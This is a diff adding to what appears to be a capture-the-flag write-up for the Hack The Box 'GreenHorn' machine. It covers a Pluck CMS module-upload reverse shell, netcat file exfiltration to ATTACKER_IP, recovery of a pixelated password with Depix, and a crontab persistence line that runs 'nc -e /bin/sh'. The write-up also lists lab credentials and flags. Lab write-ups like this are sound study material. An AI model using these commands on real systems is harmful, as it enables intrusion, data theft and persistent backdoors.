@@ -87,7 +87,7 @@ Ensure that the `shell.php` file contains the correct reverse shell and your lis
 Zip
 
 ```php
-zip revzip revshell.php 
+zip rev.zip revshell.php 
 ```
 
 Install modules
@@ -96,10 +96,155 @@ Options -> manage modules -> install a module
 
 ![[Pasted image 20240918083531.png]]
 
+Rev shell
+
+```php
+rlwrap nc -nlvp 8443
+```
+
+- _Port 8443 is an alternate port number that represents HTTPS or the Hypertext Transfer Protocol over a secure connection as given by SSL/TLS. That is to say, it is the alternative port number for the widely used default HTTPS port number 443 used in accessing web resources securely._
+
+Pluck `4.7.18` can be exploited for its RCE vulnerability. We can upload/install a module for the CMS with a ZIP file, which contains malicious PHP script. Then we can access certain path to execute the PHP script.
+
+First we create a ZIP file which has our reverse shell PHP script inside:
+
+```php
+zip openme.zip shell.php
+```
+
+Navigate to file to get a rev shell
+
+```php
+http://greenhorn.htb/data/modules/openme/shell.php
+```
+
+Stabilise shell
+
+```php
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+```php
+export TERM=xterm
+```
+
+- CTRL+Z
+
+```php
+stty raw -echo; fg
+```
 
 
+Users:
+1. git
+2. junior
+
+User: junior
+Pass: iloveyou1
+
+/home/junior
+flag1: b3b7f3e7ca451119b248a0cbf272a7eb
+
+Start transfer server
+
+```php
+python3 -m http.server 80
+```
+
+```php
+wget 10.10.14.14/<FILE>
+```
+
+Linpeas
+
+`OS: Linux version 5.15.0-113-generic (buildd@lcy02-amd64-072) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024`
+
+writable executable: /usr/local/bin/gitea
+
+Internal Ports
+- 22
+- 53
+- 80
+- 3306
+
+/etc/mysql/mariadb.cnf
+
+```php
+PermitRootLogin yes
+UsePAM yes
+    PasswordAuthentication no
+
+══╣ Possible private SSH keys were found!
+/etc/ImageMagick-6/mime.xml
+```
+
+/usr/share/openssh/sshd_config 
+
+/tmp/tmux-1000
+
+/home/junior/Using OpenVAS.pdf
+
+transfer file to my machine for inspection with a pdf viewer
+
+Me
+
+```php
+nc -lvp 4444 > FILE
+```
+
+```php
+nc -lvp 4444 > 'Using OpenVAS.pdf'
+```
+
+Target
+```php
+nc <Target> 4444 -w 3 < FILE
+```
+
+```php
+nc <ATTACKER_IP> 4444 -w 3 < 'Using OpenVAS.pdf'
+```
+
+![[Pasted image 20240919071607.png]]
 
 
+They have provided a password inside the pdf, which is just a blurred image which we cannot see.
+
+For a blurred image, we can try to **reverse the process of pixelation** to reveal the original text or content.
+
+I can use a tool called **Depix**. It essentially uses a brute-force approach combined with intelligent matching algorithms to reverse the pixelation.
+
+Extract the image from the pdf using PDF24 Tools.
+
+https://github.com/spipm/Depix
+
+Run depix on the extracted password png
+
+```php
+python3 depix.py \
+    -p /home/kali/Documents/htb/greenhorn/0.png \
+    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
+    -o /home/kali/Documents/htb/greenhorn/output.png
+
+```
+
+![[Pasted image 20240919074358.png]]
+
+![[Pasted image 20240919074437.png]]
+
+User: root
+Pass: sidefromsidetheothersidesidefromsidetheotherside
+
+root flag:
+68010f824ba1d50688172979275890e7
+
+Extra:
+
+Persistence via crontab:
+
+```php
+echo '* * * * * nc <IP> <PORT> -e /bin/sh' >> /etc/crontab
+```
 
 ---
 
